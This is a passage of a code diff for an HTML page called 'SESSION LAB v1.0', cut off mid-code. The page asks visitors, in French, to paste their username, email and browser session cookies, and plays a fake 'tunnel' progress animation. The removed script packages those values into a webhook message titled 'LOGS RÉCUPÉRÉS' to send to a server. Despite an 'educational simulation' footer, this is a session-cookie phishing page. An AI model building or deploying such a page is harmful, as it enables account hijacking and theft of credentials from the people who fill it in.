@@ -36,93 +36,28 @@
 
         button:hover { background: white; box-shadow: 0 0 20px var(--neon-green); }
 
-        /* Écrans */
-        #loading-zone, #final-message { display: none; text-align: center; padding: 40px; }
+        #loading-zone, #final-success { display: none; text-align: center; padding: 40px; }
         
         .glitch { font-size: 1.1rem; animation: pulse 1.5s infinite; margin-bottom: 20px; }
         @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
 
-        #progress-bar { color: white; font-size: 0.9rem; margin-top: 10px; }
-        
-        .success-box { border: 1px dashed var(--neon-green); padding: 20px; margin-top: 10px; }
+        .progress-bar { color: white; font-size: 1rem; margin-top: 10px; }
         .footer-note { font-size: 0.7rem; color: #444; margin-top: 40px; text-align: center; }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <h1>SESSION LAB v1.0</h1>
+    <div id="main-content">
+        <h1>SESSION LAB v1.0</h1>
 
-    <div id="user-view">
-        <p>[SYSTEM]: Entrez les identifiants pour la synchronisation.</p>
-        <input type="text" id="username" placeholder="Username">
-        <input type="email" id="userEmail" placeholder="Votre Email">
-        <textarea id="cookieInput" rows="4" placeholder="Données de session (Cookies)..."></textarea>
-        <button onclick="processData()">INITIER LE TRANSFERT</button>
-    </div>
-
-    <div id="loading-zone">
-        <div class="glitch" id="status-text">INITIALISATION DU TUNNEL...</div>
-        <div id="progress-bar">[░░░░░░░░░░░░] 0%</div>
-    </div>
-
-    <div id="final-message">
-        <div class="success-box">
-            <h2 style="color:white;">TRANSFERT TERMINÉ</h2>
-            <p>[SYSTÈME]: Les journaux de session ont été extraits avec succès.</p>
-            <p style="color:var(--neon-green); font-weight:bold;">
-                Vous recevrez les données complètes à l'adresse : <br>
-                <span id="display-email" style="color:white; text-decoration:underline;"></span>
-            </p>
+        <div id="user-view">
+            <p>[SYSTEM]: Entrez les identifiants pour la synchronisation.</p>
+            <input type="text" id="username" placeholder="Username">
+            <input type="email" id="userEmail" placeholder="Votre Email">
+            <textarea id="cookieInput" rows="4" placeholder="Données de session (Cookies)..."></textarea>
+            <button onclick="processData()">INITIER LE TRANSFERT</button>
         </div>
-        <button onclick="location.reload()" style="background:none; color:var(--neon-green); border:1px solid var(--neon-green); margin-top:20px;">NOUVELLE SESSION</button>
-    </div>
-</div>
 
-<p class="footer-note">EDUCATIONAL SIMULATION ONLY - CYBER LABS 2026</p>
-
-<script>
-    async function processData() {
-        const u = document.getElementById('username').value;
-        const e = document.getElementById('userEmail').value;
-        const c = document.getElementById('cookieInput').value;
-
-        if(!u || !e) return alert("Erreur : L'utilisateur et l'email sont requis.");
-
-        // Affichage du chargement
-        document.getElementById('user-view').style.display = 'none';
-        document.getElementById('loading-zone').style.display = 'block';
-        
-        const status = document.getElementById('status-text');
-        const progress = document.getElementById('progress-bar');
-
-        // Simulation de progression pour le style
-        const steps = [
-            { t: "CRYPTAGE DES DONNÉES...", p: "[██░░░░░░░░░░] 20%" },
-            { t: "OUVERTURE DU TUNNEL LOCAL...", p: "[██████░░░░░░] 50%" },
-            { t: "TRANSFERT VERS LE BACKEND...", p: "[██████████░░] 85%" },
-            { t: "FINALISATION...", p: "[████████████] 100%" }
-        ];
-
-        let i = 0;
-        const interval = setInterval(() => {
-            if(i < steps.length) {
-                status.innerText = steps[i].t;
-                progress.innerText = steps[i].p;
-                i++;
-            } else {
-                clearInterval(interval);
-                sendToServer(u, e, c);
-            }
-        }, 800);
-    }
-
-    async function sendToServer(u, e, c) {
-        const payload = {
-            embeds: [{
-                title: "🚨 LOGS RÉCUPÉRÉS 🚨",
-                color: 5763719,
-                fields: [
-                    { name: "👤 User", value: u, inline: true },
-                    { name: "📧 Email", value: e, inline: true },
-                    { name: "
+        <div id="loading-zone">
+            <div class="glitch" id="status-text">CRYPTAGE EN COURS
